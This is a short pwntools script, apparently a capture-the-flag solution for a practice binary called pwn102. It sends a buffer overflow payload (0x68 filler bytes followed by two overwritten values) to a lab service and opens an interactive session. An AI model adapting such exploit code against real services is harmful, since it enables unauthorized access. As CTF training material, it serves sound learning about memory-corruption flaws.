from pwn import *

payload = b'A'*0x68+p32(0xc0d3)+p32(0xc0ff33)

p = remote('10.10.165.158', 9002)
#p = process('./pwn102-1644307392479.pwn102')
p.recv()
p.send(payload)
p.interactive()

